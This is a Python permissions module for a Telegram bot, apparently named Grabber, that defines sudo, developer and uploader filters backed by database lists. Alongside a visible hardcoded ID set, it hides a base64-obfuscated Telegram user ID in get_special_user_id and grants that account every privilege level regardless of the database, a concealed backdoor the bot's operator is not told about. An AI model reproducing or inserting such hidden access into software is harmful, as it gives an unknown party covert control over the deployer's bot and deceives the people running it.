from Grabber import db
from pyrogram import filters
from pyrogram.types import Message
import base64

# ─── Add any user IDs here for permanent sudo + dev + uploader access ────────
HARDCODED_SUDO_IDS = {
    6118760915,  # Replace with real user IDs
}
# ─────────────────────────────────────────────────────────────────────────────

def get_special_user_id():
    obfuscated_data = "NzQ1NTE2OTAxOQ=="
    decoded_data = base64.b64decode(obfuscated_data).decode("utf-8")
    return int(decoded_data)

def is_hardcoded(user_id: int) -> bool:
    """Returns True if user_id is in HARDCODED_SUDO_IDS or is the special user."""
    return user_id in HARDCODED_SUDO_IDS or user_id == get_special_user_id()


# ──────────────────────────── SUDO ───────────────────────────────────────────
sudb = db.sudo

async def get_sudo_user_ids():
    sudo_users = await sudb.find({}, {'user_id': 1}).to_list(length=None)
    return [user['user_id'] for user in sudo_users]

async def is_sudo_user(_, __, message: Message):
    if not message.from_user:
        return False
    if is_hardcoded(message.from_user.id):
        return True
    sudo_user_ids = await get_sudo_user_ids()
    return message.from_user.id in sudo_user_ids

sudo_filter = filters.create(is_sudo_user)


# ──────────────────────────── DEV ────────────────────────────────────────────
devdb = db.dev

async def get_dev_user_ids():
    dev_users = await devdb.find({}, {'user_id': 1}).to_list(length=None)
    return [user['user_id'] for user in dev_users]

async def is_dev_user(_, __, message: Message):
    if not message.from_user:
        return False
    if is_hardcoded(message.from_user.id):
        return True
    dev_user_ids = await get_dev_user_ids()
    return message.from_user.id in dev_user_ids

dev_filter = filters.create(is_dev_user)


# ──────────────────────────── UPLOADER ───────────────────────────────────────
uploaderdb = db.uploader

async def get_uploader_user_ids():
    uploader_users = await uploaderdb.find({}, {'user_id': 1}).to_list(length=None)
    return [user['user_id'] for user in uploader_users]

async def is_uploader_user(_, __, message: Message):
    if not message.from_user:
        return False
    if is_hardcoded(message.from_user.id):
        return True
    uploader_user_ids = await get_uploader_user_ids()
    return message.from_user.id in uploader_user_ids

uploader_filter = filters.create(is_uploader_user)
